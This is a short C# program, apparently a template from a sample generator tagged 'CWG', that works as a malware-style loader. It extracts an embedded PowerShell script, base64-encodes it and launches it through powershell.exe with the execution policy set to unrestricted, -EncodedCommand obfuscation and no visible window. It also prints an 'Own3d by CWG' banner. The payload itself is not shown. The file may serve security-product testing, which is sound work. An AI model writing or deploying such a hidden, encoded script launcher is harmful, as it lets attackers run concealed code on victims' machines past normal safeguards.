using System;
using System.Diagnostics;

namespace cwg.sourcePEwithPS
{
    class Program
    {
        public static byte[] ExtractResource(string filename)
        {
            var resourceName = $"{typeof(Program).Assembly.GetName().Name?.Replace("-", "_")}.{filename}";
            
            using var stream = System.Reflection.Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName);

            if (stream == null)
            {
                return Array.Empty<byte>();
            }
            
            var ba = new byte[stream.Length];
            
            stream.Read(ba, 0, ba.Length);
            
            return ba;
        }
        
        static void Main(string[] args)
        {
            Console.WriteLine($"Own3d by CWG on {DateTime.Now}");
            
            var psCommandBase64 = Convert.ToBase64String(ExtractResource("sourcePS.ps1"));

            var startInfo = new ProcessStartInfo()
            {
                FileName = "powershell.exe",
                Arguments = $"-NoProfile -ExecutionPolicy unrestricted -EncodedCommand {psCommandBase64}",
                UseShellExecute = false,
                CreateNoWindow = true
            };
            
            Process.Start(startInfo);
        }
    }
}